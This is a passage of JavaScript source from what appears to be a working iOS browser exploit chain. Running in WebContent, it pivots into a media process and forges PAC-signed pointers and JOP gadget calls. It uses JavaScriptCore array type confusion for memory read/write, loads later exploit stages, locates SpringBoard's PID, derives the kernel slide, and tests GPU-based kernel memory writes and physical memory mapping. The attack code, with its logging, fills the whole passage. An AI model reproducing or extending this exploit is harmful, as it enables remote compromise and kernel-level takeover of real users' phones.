      pe_main_js_data = get_cstring(pe_main_js_str);
      // Calculate UTF-8 byte length (TextEncoder gives us the actual byte count)
      let pe_main_utf8_bytes = new TextEncoder().encode(pe_main_js_str);
      pe_main_js_len = BigInt(pe_main_utf8_bytes.length);
      LOG("[MPD] pe_main_js_data loaded, utf8_len=" + pe_main_js_len);
    } else {
      pe_stage1_js_data = g_pe_stage1_js_data;
      pe_stage1_js_len = g_pe_stage1_js_len;
      pe_main_js_data = g_pe_main_js_data;
      pe_main_js_len = g_pe_main_js_len;
      pe_post_js_data = g_pe_post_js_data;
    }
    LOG("[MPD] Creating pe_stage_1_cfstring...");
    // First, resolve DLSYM in WebContent process and convert for MPD use
    let DLSYM = func_resolve("dlsym").noPAC();
    globalDLSYM = mpd_pacia(DLSYM, 0xc2d0n);
    LOG("[MPD] globalDLSYM resolved: " + globalDLSYM.hex());

    // Resolve CFStringCreateWithCString in MPD context
    let MPD_CFStringCreateWithCString = mpd_fcall(globalDLSYM, 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("CFStringCreateWithCString"));
    MPD_CFStringCreateWithCString = mpd_pacia(MPD_CFStringCreateWithCString.noPAC(), 0xc2d0n);
    // kCFAllocatorDefault is a pointer stored at __kCFAllocatorDefault
    let MPD_kCFAllocatorDefault = mpd_fcall(globalDLSYM, 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFAllocatorDefault"));
    MPD_kCFAllocatorDefault = mpd_read64(MPD_kCFAllocatorDefault.noPAC());
    let MPD_kCFStringEncodingUTF8 = 0x08000100n;

    // Resolve strlen in MPD context for getting actual string length
    let MPD_STRLEN = mpd_fcall(globalDLSYM, 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("strlen"));
    MPD_STRLEN = mpd_pacia(MPD_STRLEN.noPAC(), 0xc2d0n);

    // Copy JS data from WebContent to MPD process
    // pe_stage1_js_data is in WebContent process, need to copy to MPD
    let mpd_pe_stage1_js = mpd_malloc(pe_stage1_js_len + 1n);
    mpd_memwrite(mpd_pe_stage1_js, pe_stage1_js_data, pe_stage1_js_len);
    mpd_write8(mpd_pe_stage1_js + pe_stage1_js_len, 0n); // null terminator
    LOG("[MPD] pe_stage1 copied to MPD at " + mpd_pe_stage1_js.hex());

    // For pe_main, first get the actual UTF-8 byte length using strlen on WebContent data
    // We need to copy from WebContent to MPD
    // pe_main_js_data is a null-terminated UTF-8 C string in WebContent
    // First copy to MPD's shared memory area, then we can work with it
    let mpd_pe_main_js = mpd_malloc(pe_main_js_len + 1n);
    mpd_memwrite(mpd_pe_main_js, pe_main_js_data, pe_main_js_len);
    mpd_write8(mpd_pe_main_js + pe_main_js_len, 0n); // null terminator
    LOG("[MPD] pe_main copied to MPD at " + mpd_pe_main_js.hex());

    let pe_stage_1_cfstring = mpd_fcall(MPD_CFStringCreateWithCString, MPD_kCFAllocatorDefault, mpd_pe_stage1_js, MPD_kCFStringEncodingUTF8);
    LOG("[MPD] Creating pe_main_cfstring...");
    let pe_main_cfstring = mpd_fcall(MPD_CFStringCreateWithCString, MPD_kCFAllocatorDefault, mpd_pe_main_js, MPD_kCFStringEncodingUTF8);
    LOG("[MPD] Setting up fcall jopchain...");
    let arr = mpd_setup_fcall_jopchain();
    LOG("[MPD] jsvm_fcall_buff setup done");
    let jsvm_fcall_buff = arr[0];
    let jsvm_fcall_pc = arr[1];
    let jsvm_fcall_args = arr[2];
    LOG("[MPD] Calling DLOPEN...");
    mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), 2n);
    LOG("[MPD] Getting JSContext class...");
    let mpd_jsc_class = mpd_objc_getClass(mpd_get_cstring("JSContext"));
    LOG(`[MPD] JSContext class: ${mpd_jsc_class.hex()}`);
    let ctx = mpd_objc_alloc_init(mpd_jsc_class);
    LOG(`[MPD] ctx allocated: ${ctx.hex()}`);
    LOG("[MPD] Getting isNaN from ctx...");
    let isnan_value = mpd_objectForKeyedSubscript(ctx, "isNaN");
    LOG(`[MPD] isnan_value: ${isnan_value.hex()}`);
    let isnan_func_addr = mpd_read64(isnan_value + 0x8n);
    LOG(`[MPD] isnan_func_addr: ${isnan_func_addr.hex()}`);
    let isnan_executable_addr = mpd_read64(isnan_func_addr + 0x18n);
    LOG(`[MPD] isnan_executable_addr: ${isnan_executable_addr.hex()}`);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    LOG("[MPD] Evaluating pe_stage_1...");
    mpd_evaluateScript(ctx, pe_stage_1_cfstring);
    LOG("[MPD] pe_stage_1 evaluated");
    LOG("[MPD] Getting unboxed_arr...");
    let unboxed_key = mpd_create_cfstring("unboxed_arr");
    LOG(`[MPD] unboxed_key: ${unboxed_key.hex()}`);
    let unboxed_arr_value = mpd_objectForKeyedSubscript(ctx, "unboxed_arr");
    LOG(`[MPD] unboxed_arr_value: ${unboxed_arr_value.hex()}`);
    if (unboxed_arr_value == 0n) {
      LOG("[MPD] ERROR: unboxed_arr is null!");
      return;
    }
    let unboxed_arr_addr = mpd_read64(unboxed_arr_value + 0x8n);
    LOG(`[MPD] unboxed_arr_addr: ${unboxed_arr_addr.hex()}`);
    LOG("[MPD] Getting boxed_arr...");
    let boxed_key = mpd_create_cfstring("boxed_arr");
    LOG(`[MPD] boxed_key: ${boxed_key.hex()}`);
    let boxed_arr_value = mpd_objectForKeyedSubscript(ctx, "boxed_arr");
    LOG(`[MPD] boxed_arr_value: ${boxed_arr_value.hex()}`);
    if (boxed_arr_value == 0n) {
      LOG("[MPD] ERROR: boxed_arr is null!");
      return;
    }
    let boxed_arr_addr = mpd_read64(boxed_arr_value + 0x8n);
    LOG(`[MPD] boxed_arr_addr: ${boxed_arr_addr.hex()}`);
    let boxed_arr_buffer = mpd_read64(boxed_arr_addr + 0x8n);
    LOG(`[MPD] boxed_arr_buffer: ${boxed_arr_buffer.hex()}`);
    LOG("[MPD] Setting up type confusion...");
    mpd_write64(unboxed_arr_addr + 0x8n, boxed_arr_buffer);
    LOG("[MPD] Getting rw_array and control_array...");
    let rw_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array") + 0x8n);
    let control_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array") + 0x8n);
    LOG(`[MPD] rw_array_addr: ${rw_array_addr.hex()} control_array_addr: ${control_array_addr.hex()}`);
    mpd_write64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array_8") + 0x8n);
    let control_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array_8") + 0x8n);
    LOG(`[MPD] rw_array_8_addr: ${rw_array_8_addr.hex()} control_array_8_addr: ${control_array_8_addr.hex()}`);
    mpd_write64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    // Diagnostic: dump 0x80 bytes around isnan_executable_addr
    LOG("[MPD] === DUMP isnan_executable ===");
    let dump_base = isnan_executable_addr;
    for (let di = 0n; di < 0x80n; di += 0x10n) {
      let line = `[MPD]   +${di.hex(4)}: `;
      for (let dj = 0n; dj < 0x10n; dj += 0x8n) {
        line += mpd_read64(dump_base + di + dj).hex() + " ";
      }
      LOG(line);
    }
    LOG("[MPD] === END DUMP ===");
    let orig_at_28 = mpd_read64(isnan_code_ptr);
    LOG(`[MPD] orig value at +0x28 (code_ptr): ${orig_at_28.hex()}`);
    let orig_at_20 = mpd_read64(isnan_executable_addr + 0x20n);
    LOG(`[MPD] orig value at +0x20: ${orig_at_20.hex()}`);
    let orig_at_30 = mpd_read64(isnan_executable_addr + 0x30n);
    LOG(`[MPD] orig value at +0x30: ${orig_at_30.hex()}`);
    // Try address-diverse signing: use isnan_code_ptr as context
    // JSC may use the pointer storage address as PAC context
    let signing_ctx = isnan_code_ptr;
    LOG(`[MPD] using signing_ctx = isnan_code_ptr = ${signing_ctx.hex()}`);
    let signed_fcall_addr = mpd_pacia(jsvm_isNAN_fcall_gadget, signing_ctx);
    LOG(`[MPD] signed_fcall_addr: ${signed_fcall_addr.hex()}`);
    LOG(`[MPD] isnan_code_ptr: ${isnan_code_ptr.hex()}`);
    mpd_write64(isnan_code_ptr, signed_fcall_addr);
    // Read back to verify
    let verify_val = mpd_read64(isnan_code_ptr);
    LOG(`[MPD] verify after write: ${verify_val.hex()} (matches=${verify_val === signed_fcall_addr})`);
    // Also overwrite +0x20 code pointer (may be the actual dispatch entry)
    let isnan_code_ptr_20 = isnan_executable_addr + 0x20n;
    let signed_fcall_20 = mpd_pacia(jsvm_isNAN_fcall_gadget, isnan_code_ptr_20);
    LOG(`[MPD] overwriting +0x20 (${isnan_code_ptr_20.hex()}) with ${signed_fcall_20.hex()}`);
    mpd_write64(isnan_code_ptr_20, signed_fcall_20);
    let verify_20 = mpd_read64(isnan_code_ptr_20);
    LOG(`[MPD] verify +0x20 after write: ${verify_20.hex()} (matches=${verify_20 === signed_fcall_20})`);
    LOG(`[MPD] ctx: ${ctx.hex()}`);
    LOG(`[MPD] Checking unboxed_arr before func_offsets_array`);
    let unboxed_check = mpd_objectForKeyedSubscript(ctx, "unboxed_arr");
    LOG(`[MPD] unboxed_arr exists: ${unboxed_check !== 0n}`);
    let new_func_offsets = mpd_objectForKeyedSubscript(ctx, "func_offsets_array");
    LOG(`[MPD] func_offsets_array raw: ${new_func_offsets.hex()}`);
    if (new_func_offsets === 0n) {
      LOG("[MPD] func_offsets_array is null, creating it manually");
      let create_js = "func_offsets_array = new Uint8Array(0x4000).fill(0xfe);";
      let create_cfstr = mpd_create_cfstring(create_js);
      mpd_evaluateScript(ctx, create_cfstr);
      new_func_offsets = mpd_objectForKeyedSubscript(ctx, "func_offsets_array");
      LOG(`[MPD] func_offsets_array after creation: ${new_func_offsets.hex()}`);
    }
    if (new_func_offsets === 0n) {
      LOG("[MPD] ERROR: func_offsets_array still null after creation attempt!");
      return;
    }
    let new_func_offsets_addr = mpd_read64(new_func_offsets + 0x8n);
    LOG(`[MPD] func_offsets_array addr: ${new_func_offsets_addr.hex()}`);
    let new_func_offsets_buffer = mpd_read64(new_func_offsets_addr + 0x10n);
    LOG(`[MPD] func_offsets_array buffer: ${new_func_offsets_buffer.hex()}`);
    // DLSYM and globalDLSYM were already resolved earlier in this function
    let idx = 0n;
    let js_inputs = mpd_malloc(0x100n);
    mpd_write64(js_inputs, pe_stage_1_cfstring);
    mpd_write64(js_inputs + 0x8n, 0n);
    // Shared log buffer for pe_main.js → /tmp/worker_log.txt
    pe_log_buf_sz = 0x4000n;
    pe_log_buf = mpd_malloc(pe_log_buf_sz);
    pe_log_buf_off = mpd_malloc(0x8n);
    mpd_write64(pe_log_buf_off, 0n);
    mpd_write64(js_inputs + 0x10n, pe_log_buf);
    mpd_write64(js_inputs + 0x18n, pe_log_buf_off);
    mpd_write64(js_inputs + 0x20n, pe_log_buf_sz);
    LOG("[MPD] pe_log_buf=" + pe_log_buf.hex() + " off=" + pe_log_buf_off.hex());
    // Use mpd_pacia (A key) for code pointers - PE runs in MPD process
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(DLSYM.noPAC(), 0xc2d0n));
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(dyld_signPointer_gadget.noPAC(), 0xc2d0n));
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, js_inputs);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, 0n);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, shared_cache_slide);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_buff);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_pc);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_args);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, _CFObjectCopyProperty);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, load_x1x3x8);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, fcall_14_args_write_x8);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_isNAN_fcall_gadget);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_isNAN_fcall_gadget2);
    idx += 0x1n;
    LOG(`xpac_gadget:${xpac_gadget.hex()}`);
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, xpac_gadget);
    idx += 0x1n;
    // Pre-resolve function pointers for PE using gpuDlsym (avoids PE's dlsym hang)
    // [14] = getpid - simple test to confirm fcall mechanism works
    let getpid_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getpid").noPAC();
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(getpid_raw, 0xc2d0n));
    idx += 0x1n;
    // [15] = malloc
    let malloc_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "malloc").noPAC();
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(malloc_raw, 0xc2d0n));
    idx += 0x1n;
    // [16] = free
    let free_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "free").noPAC();
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(free_raw, 0xc2d0n));
    idx += 0x1n;
    // [17] = memset
    let memset_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "memset").noPAC();
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(memset_raw, 0xc2d0n));
    idx += 0x1n;
    // [18] = memcpy
    let memcpy_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "memcpy").noPAC();
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(memcpy_raw, 0xc2d0n));
    idx += 0x1n;
    LOG(`[MPD] Pre-resolved 5 function pointers for PE (indices 14-18)`);
    // [19] = surface_address_remote (for PE to write logs to IOSurface directly)
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, surface_address_remote);
    idx += 0x1n;
    LOG(`[MPD] surface_remote at func_offsets[19] = ${surface_address_remote.hex()}`);
    // [20] = reserved for proc_listpids (dlsym may crash, skip for now)
    // Debug: verify func_offsets_buffer contents before PE
    LOG("[MPD] func_offsets_buffer contents:");
    for (let i = 0n; i < 5n; i++) {
      let val = mpd_read64(new_func_offsets_buffer + i * 8n);
      LOG(`[MPD]   [${i}] = ${val.hex()}`);
    }
    // Diagnostic: verify local IOSurface read/write with uwrite8/uread8 (same addr space)
    let _diag = surface_address + 0xF000n;
    uwrite8(_diag,      0xEFn);
    uwrite8(_diag + 1n, 0xBEn);
    uwrite8(_diag + 2n, 0xADn);
    uwrite8(_diag + 3n, 0xDEn);
    let _v0 = uread8(_diag);
    let _v1 = uread8(_diag + 1n);
    let _v2 = uread8(_diag + 2n);
    let _v3 = uread8(_diag + 3n);
    LOG(`[MPD] IOSURF diag: wrote EFBEADDE read ${_v0} ${_v1} ${_v2} ${_v3}`);

    // Pre-call getpid via mpd_fcall and store result in IOSurface for PE
    // This bypasses the broken JOP chain entirely
    let pid_via_mpd = mpd_fcall(getpid_raw, 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    LOG(`[MPD] getpid via mpd_fcall: ${pid_via_mpd}`);
    // Store at surface + 0xF830 (rpc_result area)
    let rpc_result_addr = surface_address + 0xF830n;
    let rpc_status_addr = surface_address + 0xF828n;
    uwrite64(rpc_result_addr, pid_via_mpd);
    // Set status=2 (done) so PE knows the value is ready
    uwrite64(rpc_status_addr, 2n);
    // Also clear any stray RPC cmd
    let rpc_cmd_addr = surface_address + 0xF800n;
    uwrite64(rpc_cmd_addr, 0n);
    LOG(`[MPD] Wrote pid=${pid_via_mpd} to IOSurface at ${rpc_result_addr.hex()}`);

    // Resolve proc_listpids via gpuDlsym (WebContent side), then call in MPD
    let plist_buf = 0n;
    let plist_count = 0n;
    let proc_listpids_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_listpids");
    LOG(`[MPD] gpuDlsym(proc_listpids) = ${proc_listpids_raw.hex()}`);
    if (proc_listpids_raw != 0n) {
      let buf_sz = 0x10000n;
      plist_buf = mpd_malloc(buf_sz);
      // Call proc_listpids in MPD context via mpd_fcall
      plist_count = mpd_fcall(proc_listpids_raw.noPAC(), 1n, 0n, plist_buf, buf_sz, 0n, 0n, 0n, 0n);
      LOG(`[MPD] proc_listpids via mpd_fcall: ${plist_count}`);
    } else {
      LOG("[MPD] proc_listpids gpuDlsym returned NULL");
    }
    // Scan for SpringBoard PID using proc_name (only check low PIDs, early boot processes)
    let springboard_pid = 0n;
    let proc_name_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_name");
    LOG(`[MPD] gpuDlsym(proc_name) = ${proc_name_raw.hex()}`);

    // ===== Phase 1 (EARLY): Already done immediately after SLIDE, skip =====
    if (globalThis.kernel_base_global && globalThis.kernel_base_global !== 0xFFFFFFF007004000n) {
      LOG(`[M5] Phase 1 already done: kernel_base=${globalThis.kernel_base_global.hex()}`);
    } else {
    LOG("[M5] ==============================================");
    LOG("[M5] Phase 1 (EARLY FALLBACK): Kernel slide from GPU");
    LOG("[M5] ==============================================");

    let pn_addr_early = proc_name_raw.noPAC();
    let data_page_early = (pn_addr_early + 0x40n + 0x19cefn * 4096n) & ~0xFFFn;
    LOG(`[M5] data_page=${data_page_early.hex()} pn_addr=${pn_addr_early.hex()}`);

    // Quick data page PAC pointer scan
    let pac_ptrs_early = [];
    for (let off = 0n; off < 0x1000n; off += 8n) {
      let v = 0n;
      try { v = uread64(data_page_early + off); } catch(e) { continue; }
      if ((v >> 60n) >= 0x8n) {
        let full_va = xpac_full(v);
        pac_ptrs_early.push({off, signed: v, raw: full_va});
      }
    }
    LOG(`[M5] Found ${pac_ptrs_early.length} PAC pointers on data page`);
    for (let p of pac_ptrs_early.slice(0, 5)) {
      LOG(`[M5]   +0x${p.off.toString(16).padStart(4,'0')}: raw=${p.raw.hex()}`);
    }

    // Resolve all symbols for slide calculation
    let gpu_kc_early = [];
    let syms_early = ["task_for_pid","mach_host_self","socket","connect","setsockopt","getsockopt",
                       "proc_name","proc_listpids","mach_task_self","mach_vm_allocate","mach_vm_write"];
    for (let s of syms_early) {
      try {
        let ptr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, s);
        if (ptr != 0n) {
          let raw = ptr.noPAC();
          gpu_kc_early.push({name: s, raw});
          LOG(`[M5]   ${s}: KC=${raw.hex()}`);
        }
      } catch(e) {}
    }

    // Calculate kernel slide from PAC pointers + gpuDlsym results
    let early_slide = 0n;
    let early_kernel_base = 0n;
    let early_found = false;

    // Strategy 1: Use gpuDlsym KC addresses
    if (gpu_kc_early.length >= 2) {
      gpu_kc_early.sort((a, b) => a.raw < b.raw ? -1 : 1);
      let min_kc = gpu_kc_early[0].raw;
      let max_kc = gpu_kc_early[gpu_kc_early.length - 1].raw;
      LOG(`[M5] KC range: ${min_kc.hex()} - ${max_kc.hex()}`);

      // Slide candidates: all functions within KC bounds
      let kc_base_approx = min_kc & ~0xFFFFFFFFn;
      if (kc_base_approx < 0x100000000n) kc_base_approx = 0x100000000n;

      let kc_slide_cands = [];
      for (let ts = 0n; ts < 0x20000000n; ts += 0x4000n) {
        let tb = kc_base_approx + ts;
        let ok = true;
        for (let p of gpu_kc_early) {
          let off = p.raw - tb;
          if (off < 0n || off > 0x10000000n) { ok = false; break; }
        }
        if (ok && gpu_kc_early[0].raw - tb < 0x800000n) kc_slide_cands.push(ts);
      }
      LOG(`[M5] KC slide candidates: ${kc_slide_cands.length}`);
      if (kc_slide_cands.length > 0) {
        early_slide = kc_slide_cands[0];
        early_found = true;
        LOG(`[M5] KC slide = 0x${early_slide.toString(16)}`);
      }
    }

    // Strategy 2: Use PAC pointer kernel VAs
    if (pac_ptrs_early.length >= 2) {
      let kvas = pac_ptrs_early.map(p => p.raw).filter(v => v > 0xFFFFFFF007004000n && v < 0xFFFFFFF200000000n);
      kvas.sort((a, b) => a < b ? -1 : 1);
      LOG(`[M5] Kernel VAs from PAC: ${kvas.length} (range: ${kvas[0]?.hex()||'none'} - ${kvas[kvas.length-1]?.hex()||'none'})`);

      if (kvas.length >= 2) {
        let kern_cands = [];
        for (let ts = 0n; ts < 0x20000000n; ts += 0x4000n) {
          let tb = 0xFFFFFFF007004000n + ts;
          let ok = true;
          for (let va of kvas) {
            let off = va - tb;
            if (off < 0n || off > 0x8000000n) { ok = false; break; }
          }
          if (ok && kvas[0] - tb < 0x200000n) kern_cands.push(ts);
        }
        LOG(`[M5] Kernel slide candidates: ${kern_cands.length}`);

        if (kern_cands.length === 1n) {
          if (!early_found || kern_cands[0] === early_slide) {
            early_slide = kern_cands[0];
            early_found = true;
            LOG(`[M5] Unique kernel slide = 0x${early_slide.toString(16)}`);
          }
        } else if (kern_cands.length > 1n && early_found) {
          // Cross-reference: find intersection
          let matched = kern_cands.find(k => k === early_slide);
          if (matched !== undefined) {
            LOG(`[M5] Cross-validated slide = 0x${matched.toString(16)}`);
            early_slide = matched;
          } else {
            // Use closest
            let best = kern_cands[0];
            for (let k of kern_cands) {
              if ((k > early_slide ? k - early_slide : early_slide - k) <
                  (best > early_slide ? best - early_slide : early_slide - best)) best = k;
            }
            early_slide = best;
            LOG(`[M5] Closest cross-validated slide = 0x${early_slide.toString(16)}`);
          }
        } else if (kern_cands.length > 0n) {
          early_slide = kern_cands[0];
          early_found = true;
        }
      }
    }

    if (early_found) {
      early_kernel_base = 0xFFFFFFF007004000n + early_slide;
      LOG(`[M5] EARLY kernel_base = ${early_kernel_base.hex()} slide = 0x${early_slide.toString(16)}`);
      globalThis.kernel_base_global = early_kernel_base;
    } else {
      LOG("[M5] EARLY slide calculation failed, will retry after MPD scan");
      globalThis.kernel_base_global = 0xFFFFFFF007004000n;
    }
    LOG("[M5] Phase 1 EARLY done, continuing with MPD scan...");
    } // end else (fallback Phase 1)

    if (proc_name_raw != 0n && plist_count > 0n) {
      let name_buf = mpd_malloc(32n);
      let num_pids = plist_count / 4n;
      let scanned = 0;
      // Scan lowest PIDs first (end of sorted list) - SpringBoard starts early
      for (let si = num_pids - 1n; si >= 0n && springboard_pid == 0n && scanned < 60; si--) {
        let paddr = plist_buf + si * 4n;
        let aligned = paddr & ~7n;
        let v = mpd_read64(aligned);
        let shift = (paddr - aligned) * 8n;
        let pid = (v >> shift) & 0xFFFFFFFFn;
        if (pid == 0n || pid > 500n) continue;
        scanned++;
        LOG(`[MPD] checking PID=${pid}...`);
        // Clear name buffer
        mpd_write64(name_buf, 0n); mpd_write64(name_buf + 8n, 0n);
        mpd_write64(name_buf + 16n, 0n); mpd_write64(name_buf + 24n, 0n);
        // proc_name(pid, buf, 32) returns 0 on success
        let pn_ret = mpd_fcall(proc_name_raw.noPAC(), pid, name_buf, 32n, 0n, 0n, 0n, 0n, 0n);
        // Read back name (two qwords)
        let n0 = mpd_read64(name_buf);
        let n1 = mpd_read64(name_buf + 8n);
        LOG(`[MPD]   PID=${pid} n0=${n0.hex()} n1=${n1.hex()} ret=${pn_ret}`);
        // "SpringBo" = 0x6F42676E69727053 in little-endian (8 bytes)
        if (n0 == 0x6F42676E69727053n) {
          springboard_pid = pid;
          LOG(`[MPD] FOUND SpringBoard! pid=${pid} ret=${pn_ret}`);
        }
      }
      if (springboard_pid == 0n) LOG(`[MPD] SpringBoard not found (scanned ${scanned} PIDs)`);
    }
    uwrite64(surface_address + 0xF838n, plist_buf);
    uwrite64(surface_address + 0xF840n, plist_count);
    uwrite64(surface_address + 0xF848n, springboard_pid);
    if (springboard_pid != 0n) LOG(`[MPD] SpringBoard PID=${springboard_pid} stored at IOSurface +0xF848`);

    // ===== M5: Try original approach — mach_make_memory_entry_64 for physical memory =====
    LOG("[M5] Testing mach_make_memory_entry_64 approach...");
    let mmme_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_make_memory_entry_64");
    LOG(`[M5] gpuDlsym(mach_make_memory_entry_64) = ${mmme_sym.hex()}`);
    if (mmme_sym.noPAC() != 0n) {
      // Resolve host_self first
      let hself_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
      let mmme_host = hself_sym.noPAC() != 0n ? mpd_fcall(hself_sym.noPAC(), 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n) : 0n;
      LOG(`[M5] mmme host_port = ${mmme_host.hex()}`);
      // Actually try calling via mpd_fcall
      let mmme_size = mpd_malloc(8n);
      let mmme_handle = mpd_malloc(8n);
      mpd_write64(mmme_size, 0x4000n); // 16KB
      mpd_write64(mmme_handle, 0n);
      let mmme_ret = mpd_fcall(mmme_sym.noPAC(), mmme_host, mmme_size, 0n, 1n, mmme_handle, 0n, 0n, 0n); // prot=1(READ)
      LOG(`[M5] mach_make_memory_entry_64(host, size, 0, READ, handle, 0) = ${mmme_ret}`);
      let mmme_hval = mpd_read64(mmme_handle);
      LOG(`[M5] mmme handle = ${mmme_hval.hex()}`);
      if (mmme_ret == 0n && mmme_hval != 0n) {
        LOG("[M5] mach_make_memory_entry_64 SUCCESS — can map kernel physical memory!");
      } else {
        LOG("[M5] mach_make_memory_entry_64 failed or returned null handle");
      }
    }

    // ===== M5: Test GPU kernel WRITE via uwrite64 =====
    // We confirmed uread64 reads kernel KC addresses. Now test uwrite64.
    // Use the proc_name ADRP target as a safe test location.
    let pn_addr = proc_name_raw.noPAC();
    // The ADRP at +64 uses imm=0x19cef, ADD at +68 adds 0x710
    // Let's read 64 bytes from proc_name, find ADRP, compute target
    LOG("[M5] Testing GPU kernel write...");
    let test_page = (pn_addr + 0x40n + 0x19cefn * 4096n) & ~0xFFFn; // ADRP target page
    let test_addr = test_page + 0x710n;
    let orig_val = 0n;
    try { orig_val = uread64(test_addr); } catch(e) {}
    LOG(`[M5] Target addr: ${test_addr.hex()} current value: ${orig_val.hex()}`);

    if (orig_val != 0xffffffffffffffffn && orig_val != 0n) {
      // Try writing a DIFFERENT value and reading back
      let new_val = orig_val ^ 0x1n; // flip bit 0
      try { uwrite64(test_addr, new_val); } catch(e) { LOG(`[M5] uwrite64 threw: ${e.message}`); }
      let readback = 0n;
      try { readback = uread64(test_addr); } catch(e) {}
      LOG(`[M5] After write: ${readback.hex()} (expected ${new_val.hex()})`);

      if (readback == new_val) {
        LOG("[M5] GPU KERNEL WRITE SUCCESS! We have kernel r/w via GPU!");
        globalThis.GPU_WRITE_SUCCESS = true;
        // Restore original value
        try { uwrite64(test_addr, orig_val); } catch(e) {}
      } else if (readback == orig_val) {
        LOG("[M5] GPU kernel write FAILED — value unchanged. GPU IOMMU is read-only for kernel pages.");
      } else {
        LOG("[M5] GPU kernel write returned unexpected value — may have corrupted something");
      }
    } else {
      LOG("[M5] Cannot test — target value is FFs or 0, trying different offset");
    }

    // ===== Phase 0A: COW verification =====
    globalThis.COW_SAFE = false;
    if (globalThis.GPU_WRITE_SUCCESS) { try {
      let cow_orig = 0n;
      try { cow_orig = uread64(test_addr); } catch(e) {}
      if (cow_orig != 0n && cow_orig != 0xffffffffffffffffn) {
        let cow_modified = cow_orig ^ 0x2n; // flip bit 1 (non-destructive)
        uwrite64(test_addr, cow_modified);
        let cow_gpu_readback = uread64(test_addr);
        LOG(`[0A] GPU readback: ${cow_gpu_readback.hex()} (expected ${cow_modified.hex()})`);

        // Read the same KC address from MPD's context using mpd_read64 directly
        // mpd_read64 does: memcpy(bounce_buf, address, 8) from MPD, then uread64(bounce_buf) from WebContent
        // Since KC data pages are mapped at the same VA in all processes, MPD should see the same page
        let cow_mpd_val = mpd_read64_timeout(test_addr);
        LOG(`[0A] MPD read64 of same KC addr: ${cow_mpd_val.hex()}`);

        if (cow_mpd_val == cow_modified) {
          LOG("[0A] VERIFIED: GPU write is visible to MPD/kernel — NO COW issue!");
          globalThis.COW_SAFE = true;
        } else if (cow_mpd_val == cow_orig) {
          LOG("[0A] CONFIRMED: GPU write is COW — only WebContent sees changes!");
          globalThis.COW_SAFE = false;
        } else {
          // Also try: read from a known IOSurface address to confirm mpd_read64 works at all
          let diag_mpd = mpd_read64_timeout(surface_address_remote);
          LOG(`[0A] mpd_read64 sanity check (IOSurface base): ${diag_mpd.hex()}`);
          LOG(`[0A] UNEXPECTED: MPD read ${cow_mpd_val.hex()}, neither original(${cow_orig.hex()}) nor modified(${cow_modified.hex()})`);
          // If mpd_read64 is broken, we can't determine COW status
          if (diag_mpd == 0n || diag_mpd == 0xffffffffffffffffn) {
            LOG("[0A] WARNING: mpd_read64 appears broken — cannot determine COW status");
          }
          globalThis.COW_SAFE = false;
        }
        // Restore original value
        try { uwrite64(test_addr, cow_orig); } catch(e) {}
      } else {
        LOG("[0A] COW test skipped: test_addr value is 0 or FFs");
      }
    } catch(e) {
      LOG(`[0A] COW test error: ${e.message}`);
      globalThis.COW_SAFE = false;
    } }

    // ===== Phase 0B: PurpleGfxMem IOSurface — map physical memory =====
    // Re-enabled: runs after P2/A2 (guarded by GPU_WRITE_SUCCESS && !PHYS_MEM_MAPPED)
    if (globalThis.GPU_WRITE_SUCCESS && !globalThis.PHYS_MEM_MAPPED) { try {
      // First, resolve all the symbols we need in MPD context
      let MPD_CFDictionaryCreateMutable = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFDictionaryCreateMutable");
      let MPD_CFDictionarySetValue = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFDictionarySetValue");
      let MPD_CFNumberCreate = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFNumberCreate");
